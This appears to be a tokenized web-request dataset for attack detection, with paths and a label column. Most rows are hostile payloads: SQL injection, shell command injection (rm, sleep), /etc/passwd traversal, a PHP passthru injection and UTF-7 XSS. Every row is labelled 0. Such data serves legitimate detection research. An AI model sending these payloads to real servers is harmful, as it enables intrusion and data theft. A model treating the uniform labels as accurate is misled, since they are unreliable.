sentences 	 labels
/ javascript / fusion . exe  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' jiyx '  =  ' jiyx  \r\n\r\n 	 0
/ string / modo = registro & login =  + vonnie & password = llanisca & nombre = onella & apellidos = wiedeman + naln & email = sirichanya @ vinavilano . pe & dni = 97036086y & direccion = calle + yela + utrilla + 150 +  & ciudad = villanueva + del + trabuco & cp = 37450 & provincia = mlaga & ntc = 3862460916827849 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  ; select case when 7717 = 7717 then 1 else null end --  \r\n\r\n 	 0
/ examples / jsp / error / cwmail . exe  \r\n\r\n 	 0
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file }  \r\n\r\n 	 0
/ top . php ? stuff =  '  ; rm \ x09q48683432 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 0
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file }  \r\n\r\n 	 0
/  { file }  \r\n\r\n 	 0
/ en-us / account / cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  \r\n\r\n 	 0
/ manager / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  \r\n\r\n 	 0
/ include / include_top . php ? g_include = xxpathxx  \r\n\r\n 	 0
/ phpmyadmin / www / delivery / ac . php ? bannerid = -1331904221 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ucypkczy ]  )  )  ; die ;  /  *  \r\n\r\n 	 0
/ examples / jsp / checkbox / kb . cgi ? view =  '  & lang = en  \r\n\r\n 	 0
/ scripts / msmmask . exe ? mask =  / nessus893655960 . asp  \r\n\r\n 	 0
/ javascript /  . passwd . ini  \r\n\r\n 	 0
/ string / strings / parameters = '  ; echo $ ifsxqahul $  (  ( 9 + 99 )  )  $  ( echo $ ifsxqahul ) xqahul '  \r\n\r\n 	 0
/ javascript / portals . exe  \r\n\r\n 	 0
/ string / strings / parameters = < head >  < meta http-equiv =  "  " content-type "  "  content =  "  " text / html ;  charset = utf-7 "  "  >   <  / head >  + adw-script + ad4-alert (  ' crosssitescripting '  )  ;  + adw- / script + ad4-  \r\n\r\n 	 0
